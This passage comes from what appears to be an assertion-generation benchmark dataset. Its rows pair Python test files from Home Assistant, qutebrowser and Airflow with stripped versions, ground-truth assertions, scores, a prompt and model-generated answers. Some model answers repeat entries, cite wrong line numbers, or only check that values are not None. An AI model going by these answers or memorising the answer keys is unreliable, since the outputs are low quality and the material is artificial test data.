 [18, 'output_82598', '==', 'output_82598.strip()', 'ensure correct stripping of output'],
 [18, 'num_82598', '>=', 0, 'number of 82598 interfaces should be non-negative'],
 [24, 'output_82599', '==', 'output_82599.strip()', 'ensure correct stripping of output'],
 [24, 'num_82599', '>=', 0, 'number of 82599 interfaces should be non-negative'],
 [29, 'num_82598', '>=', 0, 'ensure num_82598 is non-negative'],
 [29, 'num_82599', '>=', 0, 'ensure num_82599 is non-negative'],
 [32, 'output', '==', 'output.strip()', 'ensure correct stripping of output'],
 [43, 'num_rx_queues', '>=', 0, 'number of RX queues should be non-negative'],
 [44, 'num_tx_queues', '>=', 0, 'number of TX queues should be non-negative'],
 [48, 'num_ifs', '>=', 0, 'number of interfaces should be non-negative'],
 [49, 'num_cpus', '>=', 0, 'number of cpus should be non-negative'],
 [62, 'i', '>=', 0, 'interface index should be non-negative'],
 [62, 'ifname', '!=', '', 'interface name should not be empty']]"
home-assistant/home-assistant,"""""""Sensor tests for the Goalzero integration.""""""
from homeassistant.components.goalzero.const import DEFAULT_NAME
from homeassistant.components.goalzero.sensor import SENSOR_TYPES
from homeassistant.components.sensor import (
    ATTR_STATE_CLASS,
    DOMAIN,
    SensorDeviceClass,
    SensorStateClass,
)
from homeassistant.const import (
    ATTR_DEVICE_CLASS,
    ATTR_UNIT_OF_MEASUREMENT,
    ELECTRIC_CURRENT_AMPERE,
    ELECTRIC_POTENTIAL_VOLT,
    ENERGY_WATT_HOUR,
    PERCENTAGE,
    POWER_WATT,
    SIGNAL_STRENGTH_DECIBELS,
    TEMP_CELSIUS,
    TIME_MINUTES,
    TIME_SECONDS,
)
from homeassistant.core import HomeAssistant

from . import async_setup_platform

from tests.test_util.aiohttp import AiohttpClientMocker


async def test_sensors(hass: HomeAssistant, aioclient_mock: AiohttpClientMocker):
    """"""Test we get sensor data.""""""
    for description in SENSOR_TYPES:
        description.entity_registry_enabled_default = True
    await async_setup_platform(hass, aioclient_mock, DOMAIN)

    state = hass.states.get(f""sensor.{DEFAULT_NAME}_watts_in"")
    assert state.state == ""0.0""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.POWER
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == POWER_WATT
    assert state.attributes.get(ATTR_STATE_CLASS) == SensorStateClass.MEASUREMENT
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_amps_in"")
    assert state.state == ""0.0""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.CURRENT
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == ELECTRIC_CURRENT_AMPERE
    assert state.attributes.get(ATTR_STATE_CLASS) == SensorStateClass.MEASUREMENT
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_watts_out"")
    assert state.state == ""50.5""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.POWER
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == POWER_WATT
    assert state.attributes.get(ATTR_STATE_CLASS) == SensorStateClass.MEASUREMENT
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_amps_out"")
    assert state.state == ""2.1""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.CURRENT
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == ELECTRIC_CURRENT_AMPERE
    assert state.attributes.get(ATTR_STATE_CLASS) == SensorStateClass.MEASUREMENT
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wh_out"")
    assert state.state == ""5.23""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.ENERGY
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == ENERGY_WATT_HOUR
    assert state.attributes.get(ATTR_STATE_CLASS) == SensorStateClass.TOTAL_INCREASING
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wh_stored"")
    assert state.state == ""1330""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.ENERGY
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == ENERGY_WATT_HOUR
    assert state.attributes.get(ATTR_STATE_CLASS) == SensorStateClass.MEASUREMENT
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_volts"")
    assert state.state == ""12.0""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.VOLTAGE
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == ELECTRIC_POTENTIAL_VOLT
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_state_of_charge_percent"")
    assert state.state == ""95""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.BATTERY
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == PERCENTAGE
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_time_to_empty_full"")
    assert state.state == ""-1""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == TIME_MINUTES
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == TIME_MINUTES
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_temperature"")
    assert state.state == ""25""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.TEMPERATURE
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == TEMP_CELSIUS
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wifi_strength"")
    assert state.state == ""-62""
    assert state.attributes.get(ATTR_DEVICE_CLASS) == SensorDeviceClass.SIGNAL_STRENGTH
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == SIGNAL_STRENGTH_DECIBELS
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_total_run_time"")
    assert state.state == ""1720984""
    assert state.attributes.get(ATTR_DEVICE_CLASS) is None
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) == TIME_SECONDS
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wi_fi_ssid"")
    assert state.state == ""wifi""
    assert state.attributes.get(ATTR_DEVICE_CLASS) is None
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) is None
    assert state.attributes.get(ATTR_STATE_CLASS) is None
    state = hass.states.get(f""sensor.{DEFAULT_NAME}_ip_address"")
    assert state.state == ""1.2.3.4""
    assert state.attributes.get(ATTR_DEVICE_CLASS) is None
    assert state.attributes.get(ATTR_UNIT_OF_MEASUREMENT) is None
    assert state.attributes.get(ATTR_STATE_CLASS) is None
","
1""""""Sensor tests for the Goalzero integration.""""""
2from homeassistant.components.goalzero.const import DEFAULT_NAME
3from homeassistant.components.goalzero.sensor import SENSOR_TYPES
4from homeassistant.components.sensor import (
5    ATTR_STATE_CLASS,
6    DOMAIN,
7    SensorDeviceClass,
8    SensorStateClass,
9)
10from homeassistant.const import (
11    ATTR_DEVICE_CLASS,
12    ATTR_UNIT_OF_MEASUREMENT,
13    ELECTRIC_CURRENT_AMPERE,
14    ELECTRIC_POTENTIAL_VOLT,
15    ENERGY_WATT_HOUR,
16    PERCENTAGE,
17    POWER_WATT,
18    SIGNAL_STRENGTH_DECIBELS,
19    TEMP_CELSIUS,
20    TIME_MINUTES,
21    TIME_SECONDS,
22)
23from homeassistant.core import HomeAssistant
24
25from . import async_setup_platform
26
27from tests.test_util.aiohttp import AiohttpClientMocker
28
29
30async def test_sensors(hass: HomeAssistant, aioclient_mock: AiohttpClientMocker):
31    """"""Test we get sensor data.""""""
32    for description in SENSOR_TYPES:
33        description.entity_registry_enabled_default = True
34    await async_setup_platform(hass, aioclient_mock, DOMAIN)
35
36    state = hass.states.get(f""sensor.{DEFAULT_NAME}_watts_in"")
37    state = hass.states.get(f""sensor.{DEFAULT_NAME}_amps_in"")
38    state = hass.states.get(f""sensor.{DEFAULT_NAME}_watts_out"")
39    state = hass.states.get(f""sensor.{DEFAULT_NAME}_amps_out"")
40    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wh_out"")
41    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wh_stored"")
42    state = hass.states.get(f""sensor.{DEFAULT_NAME}_volts"")
43    state = hass.states.get(f""sensor.{DEFAULT_NAME}_state_of_charge_percent"")
44    state = hass.states.get(f""sensor.{DEFAULT_NAME}_time_to_empty_full"")
45    state = hass.states.get(f""sensor.{DEFAULT_NAME}_temperature"")
46    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wifi_strength"")
47    state = hass.states.get(f""sensor.{DEFAULT_NAME}_total_run_time"")
48    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wi_fi_ssid"")
49    state = hass.states.get(f""sensor.{DEFAULT_NAME}_ip_address"")
50","[['state.state', '==', '""0.0""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.POWER'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'POWER_WATT'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'SensorStateClass.MEASUREMENT'], ['state.state', '==', '""0.0""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.CURRENT'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'ELECTRIC_CURRENT_AMPERE'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'SensorStateClass.MEASUREMENT'], ['state.state', '==', '""50.5""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.POWER'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'POWER_WATT'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'SensorStateClass.MEASUREMENT'], ['state.state', '==', '""2.1""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.CURRENT'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'ELECTRIC_CURRENT_AMPERE'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'SensorStateClass.MEASUREMENT'], ['state.state', '==', '""5.23""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.ENERGY'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'ENERGY_WATT_HOUR'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'SensorStateClass.TOTAL_INCREASING'], ['state.state', '==', '""1330""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.ENERGY'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'ENERGY_WATT_HOUR'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'SensorStateClass.MEASUREMENT'], ['state.state', '==', '""12.0""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.VOLTAGE'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'ELECTRIC_POTENTIAL_VOLT'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""95""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.BATTERY'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'PERCENTAGE'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""-1""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'TIME_MINUTES'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'TIME_MINUTES'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""25""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.TEMPERATURE'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'TEMP_CELSIUS'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""-62""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'SensorDeviceClass.SIGNAL_STRENGTH'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'SIGNAL_STRENGTH_DECIBELS'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""1720984""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'None'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'TIME_SECONDS'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""wifi""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'None'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'None'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None'], ['state.state', '==', '""1.2.3.4""'], ['state.attributes.get(ATTR_DEVICE_CLASS)', '==', 'None'], ['state.attributes.get(ATTR_UNIT_OF_MEASUREMENT)', '==', 'None'], ['state.attributes.get(ATTR_STATE_CLASS)', '==', 'None']]",56,56,1.0,0.0102489019033674,"['hass: HomeAssistant', 'aioclient_mock: AiohttpClientMocker', 'description.entity_registry_enabled_default', 'state']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['hass: HomeAssistant', 'aioclient_mock: AiohttpClientMocker', 'description.entity_registry_enabled_default', 'state']
*Code:

1""""""Sensor tests for the Goalzero integration.""""""
2from homeassistant.components.goalzero.const import DEFAULT_NAME
3from homeassistant.components.goalzero.sensor import SENSOR_TYPES
4from homeassistant.components.sensor import (
5    ATTR_STATE_CLASS,
6    DOMAIN,
7    SensorDeviceClass,
8    SensorStateClass,
9)
10from homeassistant.const import (
11    ATTR_DEVICE_CLASS,
12    ATTR_UNIT_OF_MEASUREMENT,
13    ELECTRIC_CURRENT_AMPERE,
14    ELECTRIC_POTENTIAL_VOLT,
15    ENERGY_WATT_HOUR,
16    PERCENTAGE,
17    POWER_WATT,
18    SIGNAL_STRENGTH_DECIBELS,
19    TEMP_CELSIUS,
20    TIME_MINUTES,
21    TIME_SECONDS,
22)
23from homeassistant.core import HomeAssistant
24
25from . import async_setup_platform
26
27from tests.test_util.aiohttp import AiohttpClientMocker
28
29
30async def test_sensors(hass: HomeAssistant, aioclient_mock: AiohttpClientMocker):
31    """"""Test we get sensor data.""""""
32    for description in SENSOR_TYPES:
33        description.entity_registry_enabled_default = True
34    await async_setup_platform(hass, aioclient_mock, DOMAIN)
35
36    state = hass.states.get(f""sensor.{DEFAULT_NAME}_watts_in"")
37    state = hass.states.get(f""sensor.{DEFAULT_NAME}_amps_in"")
38    state = hass.states.get(f""sensor.{DEFAULT_NAME}_watts_out"")
39    state = hass.states.get(f""sensor.{DEFAULT_NAME}_amps_out"")
40    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wh_out"")
41    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wh_stored"")
42    state = hass.states.get(f""sensor.{DEFAULT_NAME}_volts"")
43    state = hass.states.get(f""sensor.{DEFAULT_NAME}_state_of_charge_percent"")
44    state = hass.states.get(f""sensor.{DEFAULT_NAME}_time_to_empty_full"")
45    state = hass.states.get(f""sensor.{DEFAULT_NAME}_temperature"")
46    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wifi_strength"")
47    state = hass.states.get(f""sensor.{DEFAULT_NAME}_total_run_time"")
48    state = hass.states.get(f""sensor.{DEFAULT_NAME}_wi_fi_ssid"")
49    state = hass.states.get(f""sensor.{DEFAULT_NAME}_ip_address"")
50",3518,"[[30, 'hass: HomeAssistant', '!=', None, ""HomeAssistant instance is required for testing""], 
[30, 'aioclient_mock: AiohttpClientMocker', '!=', None, ""AiohttpClientMocker instance is required to mock API responses""], 
[37, 'state', '!=', None, ""State should not be None after getting sensor data""],
[37, 'state', '!=', None, ""State should not be None after getting sensor data""],
[39, 'state', '!=', None, ""State should not be None after getting sensor data""],
[41, 'state', '!=', None, ""State should not be None after getting sensor data""],
[42, 'state', '!=', None, ""State should not be None after getting sensor data""],
[44, 'state', '!=', None, ""State should not be None after getting sensor data""],
[46, 'state', '!=', None, ""State should not be None after getting sensor data""],
[48, 'state', '!=', None, ""State should not be None after getting sensor data""],
[49, 'state', '!=', None, ""State should not be None after getting sensor data""],
[50, 'state', '!=', None, ""State should not be None after getting sensor data""]]"
lahwaacz/qutebrowser,"# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:

# Copyright 2014-2017 Florian Bruhin (The Compiler) <mail@qutebrowser.org>
#
# This file is part of qutebrowser.
#
# qutebrowser is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# qutebrowser is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.

""""""Tests for the Enum class.""""""

from qutebrowser.utils import usertypes

import pytest


@pytest.fixture
def enum():
    return usertypes.enum('Enum', ['one', 'two'])


def test_values(enum):
    """"""Test if enum members resolve to the right values.""""""
    assert enum.one.value == 1
    assert enum.two.value == 2


def test_name(enum):
    """"""Test .name mapping.""""""
    assert enum.one.name == 'one'
    assert enum.two.name == 'two'


def test_unknown(enum):
    """"""Test invalid values which should raise an AttributeError.""""""
    with pytest.raises(AttributeError):
        _ = enum.three  # flake8: disable=F841


def test_start():
    """"""Test the start= argument.""""""
    e = usertypes.enum('Enum', ['three', 'four'], start=3)
    assert e.three.value == 3
    assert e.four.value == 4


def test_exit():
    """"""Make sure the exit status enum is correct.""""""
    assert usertypes.Exit.ok == 0
    assert usertypes.Exit.reserved == 1


def test_is_int():
    """"""Test the is_int argument.""""""
    int_enum = usertypes.enum('Enum', ['item'], is_int=True)
    no_int_enum = usertypes.enum('Enum', ['item'])
    assert isinstance(int_enum.item, int)
    assert not isinstance(no_int_enum.item, int)


def test_unique():
    """"""Make sure elements need to be unique.""""""
    with pytest.raises(TypeError):
        usertypes.enum('Enum', ['item', 'item'])
","
1# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:
2
3# Copyright 2014-2017 Florian Bruhin (The Compiler) <mail@qutebrowser.org>
4#
5# This file is part of qutebrowser.
6#
7# qutebrowser is free software: you can redistribute it and/or modify
8# it under the terms of the GNU General Public License as published by
9# the Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# qutebrowser is distributed in the hope that it will be useful,
13# but WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15# GNU General Public License for more details.
16#
17# You should have received a copy of the GNU General Public License
18# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.
19
20""""""Tests for the Enum class.""""""
21
22from qutebrowser.utils import usertypes
23
24import pytest
25
26
27@pytest.fixture
28def enum():
29    return usertypes.enum('Enum', ['one', 'two'])
30
31
32def test_values(enum):
33    """"""Test if enum members resolve to the right values.""""""
34
35
36def test_name(enum):
37    """"""Test .name mapping.""""""
38
39
40def test_unknown(enum):
41    """"""Test invalid values which should raise an AttributeError.""""""
42    with pytest.raises(AttributeError):
43        _ = enum.three  # flake8: disable=F841
44
45
46def test_start():
47    """"""Test the start= argument.""""""
48    e = usertypes.enum('Enum', ['three', 'four'], start=3)
49
50
51def test_exit():
52    """"""Make sure the exit status enum is correct.""""""
53
54
55def test_is_int():
56    """"""Test the is_int argument.""""""
57    int_enum = usertypes.enum('Enum', ['item'], is_int=True)
58    no_int_enum = usertypes.enum('Enum', ['item'])
59
60
61def test_unique():
62    """"""Make sure elements need to be unique.""""""
63    with pytest.raises(TypeError):
64        usertypes.enum('Enum', ['item', 'item'])
65","[['enum.one.value', '==', '1'], ['enum.two.value', '==', '2'], ['enum.one.name', '==', ""'one'""], ['enum.two.name', '==', ""'two'""], ['e.three.value', '==', '3'], ['e.four.value', '==', '4'], ['usertypes.Exit.ok', '==', '0'], ['usertypes.Exit.reserved', '==', '1']]",10,8,0.8,0.0037226617031177,"['enum', '_', 'e', 'int_enum', 'no_int_enum']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['enum', '_', 'e', 'int_enum', 'no_int_enum']
*Code:

1# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:
2
3# Copyright 2014-2017 Florian Bruhin (The Compiler) <mail@qutebrowser.org>
4#
5# This file is part of qutebrowser.
6#
7# qutebrowser is free software: you can redistribute it and/or modify
8# it under the terms of the GNU General Public License as published by
9# the Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# qutebrowser is distributed in the hope that it will be useful,
13# but WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15# GNU General Public License for more details.
16#
17# You should have received a copy of the GNU General Public License
18# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.
19
20""""""Tests for the Enum class.""""""
21
22from qutebrowser.utils import usertypes
23
24import pytest
25
26
27@pytest.fixture
28def enum():
29    return usertypes.enum('Enum', ['one', 'two'])
30
31
32def test_values(enum):
33    """"""Test if enum members resolve to the right values.""""""
34
35
36def test_name(enum):
37    """"""Test .name mapping.""""""
38
39
40def test_unknown(enum):
41    """"""Test invalid values which should raise an AttributeError.""""""
42    with pytest.raises(AttributeError):
43        _ = enum.three  # flake8: disable=F841
44
45
46def test_start():
47    """"""Test the start= argument.""""""
48    e = usertypes.enum('Enum', ['three', 'four'], start=3)
49
50
51def test_exit():
52    """"""Make sure the exit status enum is correct.""""""
53
54
55def test_is_int():
56    """"""Test the is_int argument.""""""
57    int_enum = usertypes.enum('Enum', ['item'], is_int=True)
58    no_int_enum = usertypes.enum('Enum', ['item'])
59
60
61def test_unique():
62    """"""Make sure elements need to be unique.""""""
63    with pytest.raises(TypeError):
64        usertypes.enum('Enum', ['item', 'item'])
65",3342,"[[28, 'enum', '!=', None, ""enum should be properly initialized and cannot be None""],
[48, 'e', '!=', None, ""e should be properly initialized and cannot be None""],
[57, 'int_enum', '!=', None, ""int_enum should be correctly initialized and not None""],
[58, 'no_int_enum', '!=', None, ""no_int_enum should be correctly initialized and not be None""]]"
bolkedebruin/airflow,"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from unittest import TestCase, mock

from airflow.providers.google.cloud.sensors.bigquery import (
    BigQueryTableExistenceSensor,
    BigQueryTablePartitionExistenceSensor,
)

TEST_PROJECT_ID = ""test_project""
TEST_DATASET_ID = 'test_dataset'
TEST_TABLE_ID = 'test_table'
TEST_DELEGATE_TO = ""test_delegate_to""
TEST_GCP_CONN_ID = 'test_gcp_conn_id'
TEST_PARTITION_ID = ""20200101""
TEST_IMPERSONATION_CHAIN = [""ACCOUNT_1"", ""ACCOUNT_2"", ""ACCOUNT_3""]


class TestBigqueryTableExistenceSensor(TestCase):
    @mock.patch(""airflow.providers.google.cloud.sensors.bigquery.BigQueryHook"")
    def test_passing_arguments_to_hook(self, mock_hook):
        task = BigQueryTableExistenceSensor(
            task_id='task-id',
            project_id=TEST_PROJECT_ID,
            dataset_id=TEST_DATASET_ID,
            table_id=TEST_TABLE_ID,
            gcp_conn_id=TEST_GCP_CONN_ID,
            delegate_to=TEST_DELEGATE_TO,
            impersonation_chain=TEST_IMPERSONATION_CHAIN,
        )
        mock_hook.return_value.table_exists.return_value = True
        results = task.poke(mock.MagicMock())

        assert results is True

        mock_hook.assert_called_once_with(
            gcp_conn_id=TEST_GCP_CONN_ID,
            delegate_to=TEST_DELEGATE_TO,
            impersonation_chain=TEST_IMPERSONATION_CHAIN,
        )
        mock_hook.return_value.table_exists.assert_called_once_with(
            project_id=TEST_PROJECT_ID, dataset_id=TEST_DATASET_ID, table_id=TEST_TABLE_ID
        )


class TestBigqueryTablePartitionExistenceSensor(TestCase):
    @mock.patch(""airflow.providers.google.cloud.sensors.bigquery.BigQueryHook"")
    def test_passing_arguments_to_hook(self, mock_hook):
        task = BigQueryTablePartitionExistenceSensor(
            task_id='task-id',
            project_id=TEST_PROJECT_ID,
            dataset_id=TEST_DATASET_ID,
            table_id=TEST_TABLE_ID,
            partition_id=TEST_PARTITION_ID,
            gcp_conn_id=TEST_GCP_CONN_ID,
            delegate_to=TEST_DELEGATE_TO,
            impersonation_chain=TEST_IMPERSONATION_CHAIN,
        )
        mock_hook.return_value.table_partition_exists.return_value = True
        results = task.poke(mock.MagicMock())

        assert results is True

        mock_hook.assert_called_once_with(
            gcp_conn_id=TEST_GCP_CONN_ID,
            delegate_to=TEST_DELEGATE_TO,
            impersonation_chain=TEST_IMPERSONATION_CHAIN,
        )
        mock_hook.return_value.table_partition_exists.assert_called_once_with(
            project_id=TEST_PROJECT_ID,
            dataset_id=TEST_DATASET_ID,
            table_id=TEST_TABLE_ID,
            partition_id=TEST_PARTITION_ID,
        )
","
1# Licensed to the Apache Software Foundation (ASF) under one
2# or more contributor license agreements.  See the NOTICE file
3# distributed with this work for additional information
4# regarding copyright ownership.  The ASF licenses this file
5# to you under the Apache License, Version 2.0 (the
6# ""License""); you may not use this file except in compliance
7# with the License.  You may obtain a copy of the License at
8#
9#   http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing,
12# software distributed under the License is distributed on an
13# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
14# KIND, either express or implied.  See the License for the
15# specific language governing permissions and limitations
16# under the License.
17
18from unittest import TestCase, mock
19
20from airflow.providers.google.cloud.sensors.bigquery import (
21    BigQueryTableExistenceSensor,
22    BigQueryTablePartitionExistenceSensor,
23)
24
25TEST_PROJECT_ID = ""test_project""
26TEST_DATASET_ID = 'test_dataset'
27TEST_TABLE_ID = 'test_table'
28TEST_DELEGATE_TO = ""test_delegate_to""
29TEST_GCP_CONN_ID = 'test_gcp_conn_id'
30TEST_PARTITION_ID = ""20200101""
31TEST_IMPERSONATION_CHAIN = [""ACCOUNT_1"", ""ACCOUNT_2"", ""ACCOUNT_3""]
32
33
34class TestBigqueryTableExistenceSensor(TestCase):
35    @mock.patch(""airflow.providers.google.cloud.sensors.bigquery.BigQueryHook"")
36    def test_passing_arguments_to_hook(self, mock_hook):
37        task = BigQueryTableExistenceSensor(
38            task_id='task-id',
39            project_id=TEST_PROJECT_ID,
40            dataset_id=TEST_DATASET_ID,
41            table_id=TEST_TABLE_ID,
42            gcp_conn_id=TEST_GCP_CONN_ID,
43            delegate_to=TEST_DELEGATE_TO,
44            impersonation_chain=TEST_IMPERSONATION_CHAIN,
45        )
46        mock_hook.return_value.table_exists.return_value = True
47        results = task.poke(mock.MagicMock())
48
49
50            gcp_conn_id=TEST_GCP_CONN_ID,
51            delegate_to=TEST_DELEGATE_TO,
52            impersonation_chain=TEST_IMPERSONATION_CHAIN,
53        )
54            project_id=TEST_PROJECT_ID, dataset_id=TEST_DATASET_ID, table_id=TEST_TABLE_ID
55        )
56
57
58class TestBigqueryTablePartitionExistenceSensor(TestCase):
59    @mock.patch(""airflow.providers.google.cloud.sensors.bigquery.BigQueryHook"")
